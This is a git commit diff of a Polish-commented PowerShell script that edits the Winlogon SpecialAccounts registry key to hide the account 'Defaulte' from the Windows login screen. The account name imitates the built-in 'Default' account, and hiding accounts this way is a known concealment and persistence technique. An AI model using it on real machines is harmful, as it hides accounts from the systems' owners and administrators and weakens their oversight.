689a9afdec95e2a8deeac154569dec06546efd4c
Szymon <103281923+szymson2137@users.noreply.github.com>
2024-05-15 22:29:24 +0200

    Update user.ps1

--- user.ps1
+++ user.ps1
@@ -1,10 +1,16 @@
-$User = "Defaulte"
 $Path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+$User = "Defaulte"
 
 # Sprawdź, czy ścieżka istnieje, jeśli nie, utwórz ją
+if (-not (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts")) {
+    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Force
+}
+
 if (-not (Test-Path $Path)) {
     New-Item -Path $Path -Force
 }
 
-# Dodaj właściwość do rejestru
+# Dodaj nową wartość DWORD, aby ukryć użytkownika
 New-ItemProperty -Path $Path -Name $User -Value 0 -PropertyType DWORD -Force
+
+Write-Output "Użytkownik 'Defaulte' został ukryty z ekranu logowania."
